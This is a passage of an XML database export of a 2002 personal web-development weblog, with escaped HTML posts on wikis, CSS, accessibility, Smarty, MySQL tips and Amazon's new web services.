		<field name="body">&lt;p&gt;Quiet blogging day today, but I've been busy behind the scenes. Firstly I've been playing around with &lt;a href=&quot;http://tavi.sourceforge.net/&quot;&gt;TaviWiki&lt;/a&gt; (an excellent &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; Wiki engine), using it as a proof of concept for a Wiki-driven small website content management system. I've looked at several PHP Wiki's in the past and TaviWiki is the best by far, with rock solid features and a well organised code base. My only criticism is that the script relies on globals a bit too much, making it quite hard to figure out what is going on at times. I've also been working on IncDirectory, the open source sequel to my aging links directory script &lt;a href=&quot;http://www.google.com/search?q=sslinks&quot; title=&quot;The site&amp;apos;s gone so you&amp;apos;ll have to google for it&quot;&gt;ssLinks&lt;/a&gt;. Add to that &lt;a href=&quot;http://development.incutio.com/simon/fieldset-experiment.html&quot; title=&quot;Fieldset CSS Experiment&quot;&gt;a new CSS experiment&lt;/a&gt; and preliminary work on rewriting this blog to use mySQL and today has been my most productive in quite some time.&lt;/p&gt;</field>
		<field name="created">2002-07-12 19:33:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">185</field>
		<field name="title">Blog birthday</field>
		<field name="slug">blogBirthday</field>
		<field name="body">&lt;p&gt;This blog is one month old today :) According to my &lt;a href=&quot;/~cs1spw/blog/stats.php&quot;&gt;category statistics page&lt;/a&gt; I've posted 185 entries covering 23 different topics. Quite frankly, that statistic scares me...&lt;/p&gt;</field>
		<field name="created">2002-07-12 19:45:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">186</field>
		<field name="title">Blogroll etiquette</field>
		<field name="slug">blogrollEtiquette</field>
		<field name="body">&lt;p&gt;Jordon Cooper on &lt;a href=&quot;http://www.jordoncooper.com/2002_07_01_oldblogs.html#85220197&quot;&gt;Blogroll Etiquette&lt;/a&gt;. I haven't made it on to many blog rolls yet but it's always nice to spot a new site in my referrals. The problem with having a blogroll powered by &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; is that you can only blogroll blogs that ping either blo.gs or &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;weblogs.com&lt;/a&gt;. I have actually gone as far as emailing several bloggers who's blog I admire but am unable to link to due to their absence from these useful central repositories - the responses I've had have been positive so I'm hoping to add them again shortly.&lt;/p&gt;</field>
		<field name="created">2002-07-12 19:52:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">187</field>
		<field name="title">Smarty at OSCON</field>
		<field name="slug">smartyAtOSCON</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://smarty.php.net/&quot;&gt;Smarty&lt;/a&gt; at &lt;acronym title=&quot;The O&amp;apos;Reilly Open Source Convention&quot;&gt;OSCON&lt;/acronym&gt;: &lt;q cite=&quot;http://smarty.php.net/&quot;&gt;Andrei Zmievski and Sterling Hughes will be presenting a tutorial titled &quot;Template Architectures with Smarty&quot; at the O'Reilly Open Source Convention in San Diego, July 22-26, 2002&lt;/q&gt;. Further details &lt;a href=&quot;http://conferences.oreillynet.com/cs/os2002/view/e_sess/2747&quot; title=&quot;Template Architectures with Smarty&quot;&gt;are available here&lt;/a&gt;. Smarty is a powerful template engine for PHP which combines a highly versatile templating language with excellent performance gained through template compilation.&lt;/p&gt;</field>
		<field name="created">2002-07-12 20:06:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">188</field>
		<field name="title">Jonathan on longdesc</field>
		<field name="slug">jonathanOnLongdesc</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://weblog.delacour.net/archives/000591.html&quot; title=&quot;Jonathan Delacour: Say goodbye to LONGDESC&quot;&gt;Jonathan has insider knowledge&lt;/a&gt; that Mark will not be covering the &lt;code&gt;longdesc&lt;/code&gt; attribute in his &lt;a href=&quot;http://diveintomark.org/archives/rooms/30_days_to_a_more_accessible_weblog/index.html&quot; title=&quot;30 days to a more accessible weblog&quot;&gt;accessibility series&lt;/a&gt;. This it not because longdesc is not a useful accessibility tool, but simply because it does not fit the &quot;fire and forget&quot; nature of Mark's series. Jonathan's post discusses &lt;code&gt;longdesc&lt;/code&gt; and the difficulties involved in adequately describing an image.&lt;/p&gt;</field>
		<field name="created">2002-07-13 17:12:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">189</field>
		<field name="title">Maccaws</field>
		<field name="slug">maccaws</field>
		<field name="body">&lt;p&gt;&lt;acronym title=&quot;Making A Commercial Case for Adopting Web Standards&quot;&gt;MACCAWS&lt;/acronym&gt; is &lt;q cite=&quot;http://www.maccaws.com/&quot;&gt;a group of web professionals dedicated to&lt;/q&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.maccaws.com/&quot;&gt;
&lt;ol&gt;&lt;li&gt;Promoting education and understanding of the benefits of standards compliance from a business perspective;&lt;/li&gt;
&lt;li&gt;Convincing business and industry leaders, other web professionals and clients to adopt web standards;&lt;/li&gt;
&lt;li&gt;Providing information and resources to other web professionals to help them to convince their colleagues and clients to produce standards compliant web sites.&lt;/li&gt;&lt;/ol&gt;&lt;/blockquote&gt;&lt;p&gt;This is all about advocating web standards in a language that businesses understand. We have over a hundred members, a &lt;a href=&quot;http://www.maccaws.com/&quot; title=&quot;MACCAWS Site&quot;&gt;site&lt;/a&gt;, a &lt;a href=&quot;http://groups.yahoo.com/group/vkit/&quot;&gt;Yahoo Group&lt;/a&gt; and a &lt;a href=&quot;http://www.maccaws.com/wiki/&quot;&gt;Wiki&lt;/a&gt; set up by yours truly. More on this as it develops.&lt;/p&gt;</field>
		<field name="created">2002-07-14 02:52:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">190</field>
		<field name="title">Wiki fun</field>
		<field name="slug">wikiFun</field>
		<field name="body">&lt;p&gt;Yesterday I set up a &lt;a href=&quot;http://smarty.incutio.com/&quot;&gt;Wiki for Smarty&lt;/a&gt; as well. I like Wikis. The WikiEngine used for Smarty and &lt;acronym title=&quot;Making A Commercial Case for Adopting Web Standards&quot;&gt;MACCAWS&lt;/acronym&gt; is called &lt;a href=&quot;http://tavi.sourceforge.net/&quot;&gt;TaviWiki&lt;/a&gt;, and is implemented in PHP with a MySQL back end. I had previously deployed &lt;a href=&quot;http://ontosys.com/phiki/&quot;&gt;PhikiWiki&lt;/a&gt; for a couple of university projects, which is good in that it is the only PHP Wiki I know of that works from the file system, but bad in that it has no support for version tracking (essential if your Wiki is accessible to the public).&lt;/p&gt;</field>
		<field name="created">2002-07-14 03:01:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">191</field>
		<field name="title">An excellent rant</field>
		<field name="slug">anExcellentRant</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.lobowalk.com/&quot;&gt;Lobowalk&lt;/a&gt; is a &quot;somewhat daily&quot; blog that has just made the transition to using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for layout. The decision to go &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; was accompanied by an excellent rant:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.lobowalk.com/&quot;&gt;&lt;p&gt;Why am I doing this? Because right now the web is such a freakin' mess with all of it's proprietary crap and browsers that don't adhere to standards. I know, my little meager site will not make any difference but that's okay. I'm the type of person that if I can't do something the right way then I'd prefer not to do it at all. Besides, the main reason I even have this site here is for the fun of learning and expanding. If I have to put a bunch of hacks and work around's in this site in order for it to look similar in all browsers in all platforms then it's not fun. Also, hacks, proprietary markup and nested tables is utter nonsense.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;No permalink because none are available on the site.&lt;/p&gt;</field>
		<field name="created">2002-07-14 03:07:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">192</field>
		<field name="title">Less is more</field>
		<field name="slug">lessIsMore</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.textbased.com/~minimalist/&quot;&gt;Minimalist Web Project&lt;/a&gt; is a collection of good looking web sites adhering to the minimalist style, based on the idea that &quot;less is more&quot;. Some beautiful sites are listed, including &lt;a href=&quot;http://www.37signals.com/&quot;&gt;37signals&lt;/a&gt;' brand new CSS/XHTML design.&lt;/p&gt;</field>
		<field name="created">2002-07-14 03:13:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">193</field>
		<field name="title">Mozilla web author FAQ</field>
		<field name="slug">mozillaWebAuthorFAQ</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.mozilla.org/docs/web-developer/faq.html&quot;&gt;Mozilla Web Author FAQ&lt;/a&gt; answers questions on doctypes, broken stylesheets, image table gaps and javascript detection - the most common problems faced by web developers new to developing for Mozilla all on one handy, concise page.&lt;/p&gt;</field>
		<field name="created">2002-07-14 15:14:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">194</field>
		<field name="title">Maybe splash screens have a purpose</field>
		<field name="slug">maybeSplashScreensHaveAPurpose</field>
		<field name="body">&lt;p&gt;I never thought I'd say this, but there is a place on this earth for web site splash screens and time wasting intro animations (now I'm feeling dirty). This comes after an interesting if slightly heated debate about the merits of splash screens &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?postid=496987&quot; title=&quot;To Splash or not to splash?&quot;&gt;over on the SitePoint Forums&lt;/a&gt;. I still can't stand splash screens, but I can acknowledge that there are some web users who see the web primarily as an entertainment platform and have their surfing experience enhanced by a bit of glitzy animation along side their information. Thanks Bill Posters for helping me understand this bizzare side of the surfing demographic ;)&lt;/p&gt;</field>
		<field name="created">2002-07-14 15:28:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">195</field>
		<field name="title">Which power puff girl is your blog?</field>
		<field name="slug">whichPowerPuffGirlIsYourBlog</field>
		<field name="body">&lt;p&gt;Oh wow. &lt;a href=&quot;http://www.jillmatrix.com/quiz.html&quot;&gt;Which PowerPuff Girl is your blog?&lt;/a&gt;. I'm &lt;a href=&quot;http://www.jillmatrix.com/blossom.html&quot;&gt;Blossom&lt;/a&gt; - yay! Thanks Mark-from-uni for the tip off :)&lt;/p&gt;</field>
		<field name="created">2002-07-14 16:37:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">196</field>
		<field name="title">MySQL best practise</field>
		<field name="slug">mysqlBestPractise</field>
		<field name="body">&lt;p&gt;O'Reilly have a new article up entitled &lt;a href=&quot;http://www.onlamp.com/pub/a/onlamp/2002/07/11/MySQLtips.html&quot;&gt;Ten MySQL Best Practises&lt;/a&gt;. Jeremy Zawodny &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000078.html#000078&quot; title=&quot;MySQL: Better Practices&quot;&gt;has a few problems&lt;/a&gt; with the article, and Tony Bowden &lt;a href=&quot;http://www.tmtm.com/insanity/2002/07/14.html#a193&quot; title=&quot;MySQL best practices&quot;&gt;throws in some comments&lt;/a&gt; as well. There's plenty of useful information distributed between the three viewpoints.&lt;/p&gt;</field>
		<field name="created">2002-07-14 19:00:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">197</field>
		<field name="title">XML fun</field>
		<field name="slug">xmlFun</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://poorbuthappy.com/ease/000311.html&quot;&gt;Peter has upgraded his blog&lt;/a&gt; to the latest version of &lt;a href=&quot;http://www.moveabletype.org/&quot;&gt;Moveable Type&lt;/a&gt;. As a result, his blog now pings &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;weblogs.com&lt;/a&gt; via &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calling&quot;&gt;XML-RPC&lt;/acronym&gt; whenever he makes an update. &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; grabs the &lt;a href=&quot;http://www.weblogs.com/changes.xml&quot;&gt;weblogs.com changes.xml file&lt;/a&gt; once an hour and uses it to generate a smaller file listing only sites on my blogroll. My site then grabs &lt;a href=&quot;http://blo.gs/296/favorites.xml&quot;&gt;my personal favorites.xml file&lt;/a&gt; once an hour and uses it to render my blogroll ordered by the time each blog was updated.&lt;/p&gt;

&lt;p&gt;Isn't &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; &lt;strong&gt;&lt;em&gt;fun?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</field>
		<field name="created">2002-07-15 02:18:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">198</field>
		<field name="title">Fifty two projects</field>
		<field name="slug">fiftyTwoProjects</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.52projects.com/&quot;&gt;52 projects&lt;/a&gt; (via &lt;a href=&quot;http://poorbuthappy.com/ease/000312.html&quot; title=&quot;Guide to Ease&quot;&gt;Peter&lt;/a&gt;):&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Hopefully these projects will give you a starting off point, or maybe some inspiration, perhaps a reminder of the thing that you've been wanting to do.&lt;/p&gt;&lt;p&gt;52 projects is just a project I've been wanting to do.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-15 02:23:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">199</field>
		<field name="title">Python in PHP</field>
		<field name="slug">pythonInPHP</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.csh.rit.edu/~jon/projects/pip/&quot;&gt;Python in PHP&lt;/a&gt; (via HarryF on the &lt;a href=&quot;http://www.sitepointforums.com/&quot;&gt;SitePoint Forums&lt;/a&gt;):&lt;/p&gt;&lt;blockquote cite=&quot;http://www.csh.rit.edu/~jon/projects/pip/&quot;&gt;&lt;p&gt;As both a Python and PHP enthusiast, I wanted to bring these two systems together to promote even greater and more interesting development opportunities.&lt;/p&gt;

&lt;p&gt;To that end, I've written a Python extension for PHP. In short, this extensions allows the Python interpretter to be embedded inside of PHP (think of PHP as the parent language with Python as its child). This allows native Python objects to be instantiated and manipulated from within PHP. There is also initial support for accessing PHP functions and data from within the embedded Python environment.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;This is currently only an early proof of concept available as source code but it could turn in to something very cool indeed.&lt;/p&gt;</field>
		<field name="created">2002-07-15 02:34:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">200</field>
		<field name="title">Accessible fonts</field>
		<field name="slug">accessibleFonts</field>
		<field name="body">&lt;p&gt;Mark has out-done himself today with his long awaited &lt;a href=&quot;http://diveintomark.org/archives/2002/07/15.html#day_26_using_relative_font_sizes&quot; title=&quot;Day 26: Using relative font sizes&quot;&gt;coverage of relative font sizes&lt;/a&gt;. This is a notoriously tough topic (thanks to a whole bunch of strange &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; bugs and browser differences) but Mark carefully and comprehensively explains the various work arounds and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; hacks needed to get the right effect with maximum accessibility.&lt;/p&gt;</field>
		<field name="created">2002-07-15 20:26:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">201</field>
		<field name="title">Via Blogzilla...</field>
		<field name="slug">viaBlogzilla</field>
		<field name="body">&lt;p&gt;A couple of Mozilla pieces, courtesty of &lt;a href=&quot;http://www.deftone.com/blogzilla/&quot;&gt;Blogzilla&lt;/a&gt;. First up is the news that Dave Hyatt is leaving Netscape to work for Apple (Hixie &lt;a href=&quot;http://ln.hixie.ch/?start=1026612461&quot; title=&quot;He got me invested in some kinda fruit company&quot;&gt;mentioned this&lt;/a&gt; the other day). Blogzilla's jeffp &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/rumor_mongering.html&quot; title=&quot;Rumor Mongering&quot;&gt;wonders&lt;/a&gt; if this could mean the beginning of iBrowser, considering Dave's previous work on the &lt;a href=&quot;http://chimera.mozdev.org/&quot;&gt;Chimera&lt;/a&gt; browser which builds a Mac interface on top of Mozilla.&lt;/p&gt;

&lt;p&gt;Blogzilla also &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/incremental_search_in_a_webpage.html&quot; title=&quot;Incremental search in a webpage&quot;&gt;report&lt;/a&gt; on a new proposed Mozilla feature entitled &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=30088&quot; title=&quot;bug 30088 - [RFE] Incremental find&quot;&gt;Incremental Find&lt;/a&gt;. This feature lets you type straight in to Mozilla and have the cursor jump to links matching what you type, allowing for lightning fast browsing via the keyboard. An XPI to install a preview of the feature can be downloaded &lt;a href=&quot;http://www.mozilla.org/projects/ui/accessibility/typeaheadfind.html&quot; title=&quot;Type Ahead Find&quot;&gt;from here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-15 21:18:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">202</field>
		<field name="title">Blogchat rocks</field>
		<field name="slug">blogchatRocks</field>
		<field name="body">&lt;p&gt;I spent a while today over at &lt;a href=&quot;http://brentashley.blogchat.com/&quot;&gt;Brent Ashley's blog&lt;/a&gt; chatting away on BlogChat. BlogChat is Brent's impressive &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; chat system (backend in &lt;acronym title=&quot;PHP: Hypertext Proprocessor&quot;&gt;PHP&lt;/acronym&gt;, front end via &lt;a href=&quot;http://www.ashleyit.com/rs/main.htm&quot; title=&quot;JavaScript Remote Scripting&quot;&gt;JSRS&lt;/a&gt;) which allows anyone visiting his blog to talk to him (and other visitors) in real time, provided he is online to host the session. During the afternoon I got to talk to people from all over the world, all with similar interests because they all had the same taste in blogs. I am hoping to install a version of Brent's system on this site in the not-too-distant future.&lt;/p&gt;</field>
		<field name="created">2002-07-15 21:31:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">203</field>
		<field name="title">You can't win</field>
		<field name="slug">youCantWin</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.joelonsoftware.com/news/20020715.html&quot; title=&quot;Measurement&quot;&gt;Joel on Software&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.joelonsoftware.com/news/20020715.html&quot;&gt;&lt;p&gt;Software organizations tend to reward programmers who (a) write lots of code and (b) fix lots of bugs. The best way to get ahead in an organization like this is to check in lots of buggy code and fix it all, rather than taking the extra time to get it right in the first place.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-15 21:36:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">204</field>
		<field name="title">Pretty link on Kottke</field>
		<field name="slug">prettyLinkOnKottke</field>
		<field name="body">&lt;p&gt;In a discussion on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt; recently about underlines a on links, I pointed to &lt;a href=&quot;http://www.kottke.org/&quot;&gt;kottke.org&lt;/a&gt; as an example of clever use of CSS for links where by the link underline is a slightly later colour than the link text. Today, Jason &lt;a href=&quot;http://www.kottke.org/02/07/020715hyperlinks_s.html&quot; title=&quot;Hyperlinks should be seen but not heard&quot;&gt;explains the technique&lt;/a&gt; and the thinking behind it.&lt;/p&gt;</field>
		<field name="created">2002-07-16 09:51:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">205</field>
		<field name="title">&quot;Erect me a great golden pyramid&quot;</field>
		<field name="slug">erectMeAGreatGoldenPyramid</field>
		<field name="body">&lt;p&gt;David Hyatt's &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/2002_07_14_mozillian_archive.html#85252157&quot; title=&quot;Hi ho. Hi ho.&quot;&gt;neo-cortical implant&lt;/a&gt; is holding out just fine.&lt;/p&gt;</field>
		<field name="created">2002-07-16 10:42:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">206</field>
		<field name="title">EyeDropper</field>
		<field name="slug">eyeDropper</field>
		<field name="body">&lt;p&gt;Handy software tip courtesy of &lt;a href=&quot;http://tfountain.co.uk/&quot;&gt;Tim&lt;/a&gt; (my colleague at &lt;a href=&quot;http://www.incutio.com/&quot;&gt;Incutio&lt;/a&gt;). &lt;a href=&quot;http://eyedropper.inetia.com/HTML/eng/default.asp&quot;&gt;EyeDropper&lt;/a&gt; is a tiny shareware program for Windows which adds a magnifying glass to your mouse pointer, displaying the hex colour code of the pixel under your mouse pointer. The download is a measily 27KB and it saves having to print screen and load up a graphics package just to find a HTML colour code. When not in use it sits in your systray.&lt;/p&gt;</field>
		<field name="created">2002-07-16 12:20:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">207</field>
		<field name="title">XHTML nested lists</field>
		<field name="slug">xhtmlNestedLists</field>
		<field name="body">&lt;p&gt;Things I learnt today part one: Nested lists in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; are possible, but you can't just put a list inside another list. You have to nest the nested list in a list item. References: &lt;a href=&quot;http://www.w3schools.com/xhtml/xhtml_html.asp&quot; title=&quot;XHTML vs HTML&quot;&gt;W3Schools XHTML differences&lt;/a&gt;  and &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-html/2001Dec/0056.html&quot; title=&quot;nested lists in xhtml-transitional&quot;&gt;the www-html mailing list&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-16 18:43:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">208</field>
		<field name="title">Heated discussion</field>
		<field name="slug">heatedDiscussion</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/comments.php?t=1026343791&quot; title=&quot;Heated comments thread regarding connected-earth&quot;&gt;An interesting discussion&lt;/a&gt; (scroll to the bottom).&lt;/p&gt;</field>
		<field name="created">2002-07-16 19:44:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">209</field>
		<field name="title">Fun with &amp;lt;link&amp;gt;</field>
		<field name="slug">funWithLink</field>
		<field name="body">&lt;p&gt;Things I learnt today part two: The &amp;lt;link&amp;gt; tag is &lt;em&gt;fun&lt;/em&gt;. I've been building support for it in to &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/12/#busyDay&quot; title=&quot;IncDirectory mentioned in my blog archive&quot;&gt;IncDirectory&lt;/a&gt; (not long now) - it took a while to find the necessary background information but &lt;a href=&quot;http://diveintomark.org/archives/2002/06/20.html#day_9_providing_additional_navigation_aids&quot; title=&quot;Day 9: Providing additional navigation aids&quot;&gt;Mark Pilgrim&lt;/a&gt;, &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-html/2001Oct/0026.html&quot; title=&quot;The &amp;lt;link&amp;gt; Element in Mozilla&amp;apos;s Site Navigation Bar&quot;&gt;www-html&lt;/a&gt;, and &lt;a href=&quot;http://www.w3.org/TR/html4/types.html#type-links&quot; title=&quot;Link Types in HTML&quot;&gt;the W3C&lt;/a&gt; gave me everything I needed.&lt;/p&gt;</field>
		<field name="created">2002-07-16 20:11:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">210</field>
		<field name="title">More CSS demos</field>
		<field name="slug">moreCSSDemos</field>
		<field name="body">&lt;p&gt;Chris Smith has an &lt;a href=&quot;http://www.rpgme.com/cssdev/&quot; title=&quot;Index of /cssdev&quot;&gt;interesting set&lt;/a&gt; of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; demos, including some attractive &lt;a href=&quot;http://www.rpgme.com/cssdev/cssbuttons.htm&quot;&gt;CSS buttons&lt;/a&gt; and an excellent example of a &lt;a href=&quot;http://www.rpgme.com/cssdev/login.html&quot; title=&quot;Login form&quot;&gt;more complex layout&lt;/a&gt;. There's a lot of interesting creative work going on with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; at the moment as more developers start exploring the possibilities it brings - Eric Meyer's &lt;a href=&quot;http://www.meyerweb.com/eric/css/edge/&quot;&gt;css/edge&lt;/a&gt; is just the tip of the iceberg.&lt;/p&gt;</field>
		<field name="created">2002-07-16 23:13:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">211</field>
		<field name="title">Accessible headers</field>
		<field name="slug">accessibleHeaders</field>
		<field name="body">&lt;p&gt;Mark's latest &lt;a href=&quot;http://diveintomark.org/archives/2002/07/16.html#day_27_using_real_headers&quot; title=&quot;Day 27: Using real headers&quot;&gt;accessibility tip&lt;/a&gt; concerns header tags (&amp;lt;h1&amp;gt; through &amp;lt;h6&amp;gt;). Mark explains that using headers in the right order helps screen readers to interpret the structure of your pages, and shows how to use CSS to effectively style headers. Mark once again demonstrates the comment hack as a way of bringing Netscape 4 in line with other browsers, a technique that has been &lt;a href=&quot;http://www.whump.com/moreLikeThis/link/02966&quot; title=&quot;Stop using the @#$! NS 4.0 Hacks, dammit!&quot;&gt;criticised by the More Like This Weblog&lt;/a&gt; as unnecessary encouragement for NS4 users. Incidentally, Johannes Koch has &lt;a href=&quot;http://pixels.pixelpark.com/~koch/hide_css_from_browsers/&quot; title=&quot;Hide CSS from Browsers&quot;&gt;an excellent summary&lt;/a&gt; of CSS hiding techniques.&lt;/p&gt;</field>
		<field name="created">2002-07-16 23:24:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">212</field>
		<field name="title">Dashes and hyphens</field>
		<field name="slug">dashesAndHyphens</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.cs.tut.fi/~jkorpela/dashes.html&quot;&gt;Dashes and hyphens&lt;/a&gt; in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-16 23:27:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">213</field>
		<field name="title">CSS could be so much more</field>
		<field name="slug">cssCouldBeSoMuchMore</field>
		<field name="body">&lt;p&gt;Stuart Langridge &lt;a href=&quot;http://www.kryogenix.org/days/2002_07.cas#000152&quot;&gt;discusses the nature of minimalism&lt;/a&gt; and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; design, following a &lt;a href=&quot;http://www.dellah.com/orient/2002/07/15/the_minimalist_web_project.shtml&quot;&gt;post by Sarabian&lt;/a&gt;. Stuart wonders if the current trend for relatively plain site designs is an interim period while we find our feet in the relatively new medium of CSS. I am sure it is - while I personally love the elegance and simplicity being showcase in many pure CSS sites, it's not going to help convert die hard table fanatics. The annoying thing is that CSS is capable of so much - the &lt;a href=&quot;http://www.w3schools.com/css/css_background.asp&quot; title=&quot;CSS Background Properties&quot;&gt;power it gives us&lt;/a&gt; over background images should free designers to do things that were difficult or impossible with tables. I'm a rubbish designer, but I'm considering taking on the challenge of &quot;interesting&quot; CSS design in the not too distant future. If I can make things look good, anyone can ;)&lt;/p&gt;</field>
		<field name="created">2002-07-16 23:38:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">214</field>
		<field name="title">Goodbye to BurningBird</field>
		<field name="slug">goodbyeToBurningbird</field>
		<field name="body">&lt;p&gt;Burningbird has &lt;a href=&quot;http://weblog.burningbird.net/archives/000370.php&quot; title=&quot;So Long, and thanks for all the posts&quot;&gt;hung up her wings&lt;/a&gt;. Dorothea thoughtfully &lt;a href=&quot;http://www.textartisan.com/caveatlector/archive/2002_07.html#e000310&quot; title=&quot;Kudos&quot;&gt;blogs her departure&lt;/a&gt;, disagreeing with her suggestion that blogged content suffers from a lack of permanence. One of the reasons I blog is that I hope to increase my skill with the written word, so it is interesting to see someone at the opposite end of the spectrum who feels they must stop blogging to keep writing. As for permenance, I have often worried that particularly valuable articles can get lost in archives - to this end I hope to implement a permanent feature archive in my blog redesign, somewhere I can keep larger articles in a more easily surfed format than an archive.&lt;/p&gt;</field>
		<field name="created">2002-07-16 23:55:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">215</field>
		<field name="title">Amazon web services</field>
		<field name="slug">amazonWebServices</field>
		<field name="body">&lt;p&gt;Amazon have launched a brand new &lt;a href=&quot;http://associates.amazon.com/exec/panama/associates/join/developer/resources.html&quot; title=&quot;Amazon.com Web Services&quot;&gt;web service interface&lt;/a&gt; to their huge database of products. I've been playing around with it, and I've knocked together a simple &lt;a href=&quot;http://scripts.incutio.com/amazon/&quot; title=&quot;PHP Amazon Search&quot;&gt;search engine example&lt;/a&gt; in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, with the code available for anyone who wants it. I did a &lt;a href=&quot;http://scripts.incutio.com/google/&quot; title=&quot; Accessing the Google Web API via PHP&quot;&gt;similar thing&lt;/a&gt; a few months ago when Google released their Web &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; so we've set up a new site at Incutio to host these and other open source projects - &lt;a href=&quot;http://scripts.incutio.com/&quot;&gt;scripts.incutio.com&lt;/a&gt;. The site is only a few hours old and we'd love some feedback - &lt;a href=&quot;http://www.incutio.com/contact.php&quot; title=&quot;Contact Incutio&quot;&gt;contact us&lt;/a&gt; directly or add a comment to this entry.&lt;/p&gt;</field>
		<field name="created">2002-07-17 11:08:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">216</field>
		<field name="title">Fun with Amazon</field>
		<field name="slug">funWithAmazon</field>
